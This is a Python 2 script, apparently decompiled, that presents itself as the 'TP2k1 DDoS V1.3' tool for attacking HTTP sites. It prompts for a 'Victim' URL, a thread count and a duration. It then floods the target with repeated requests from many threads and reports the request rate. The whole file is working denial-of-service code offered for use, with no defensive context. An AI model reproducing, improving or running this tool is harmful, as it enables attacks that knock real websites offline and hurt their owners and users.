# Embedded file name: C:\Users\Giorgio\Desktop\a.py
import urllib, os, threading, time, sys
print '\n                     ###################################\n'
print '                 01010o.....::TP2k1 DDoS V1.3::.....o01010\n'
print '              #################################################'
print
print '\t         DDos Tool for HTTP site, Coded by TP2k1\n'
if os.name in ('nt', 'dos', 'ce'):
    os.system('title       ........::::: TP2k1 DDoS V1.3 :::::........')
    os.system('color a')
Close = False
Lock = threading.Lock()
Request = 0
Tot_req = 0

class Spammer(threading.Thread):

    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number

    def run(self):
        global Lock
        global Tot_req
        global Close
        global Request
        Lock.acquire()
        print 'Starting thread #{0}'.format(self.num)
        Lock.release()
        while Close == False:
            try:
                urllib.urlopen(self.url)
                Request += 1
                Tot_req += 1
            except:
                pass

        Lock.acquire()
        print 'Closing thread #{0}'.format(self.num)
        Lock.release()
        sys.exit(0)


if __name__ == '__main__':
    try:
        num_threads = input('> So luong dap(800): ')
        t_tot = input('> Time(2): ')
    except:
        t_tot = 2

    timer = t_tot * 60
    t_tot = t_tot * 60
    while True:
        url = raw_input('> Victim: ')
        try:
            urllib.urlopen(url)
        except IOError:
            print 'Could not open specified url.'
        else:
            break

    for i in xrange(num_threads):
        Spammer(url, i + 1).start()

    time.sleep(2)
    print '#######################################################################'
    print '\n> Bot Are Loaded Sucessfully.'
    print '\n> TP2k1 is working hard. . .\n'
    while timer > 0:
        time.sleep(10)
        print '> TP2k1 @ ' + str(Request / 10.0) + ' Requests/s\tTotal Request: #' + str(Tot_req) + '\tTime left:', timer, 's'
        Request = 0
        timer -= 10

    print '\n> Average  @ ' + str(Tot_req / t_tot) + ' Requests/s'
    print '\n#######################################################################\n'
    raw_input('> TP2k1 is still working, now you can press enter to shutting down threads.')
    time.sleep(1)
    Close = True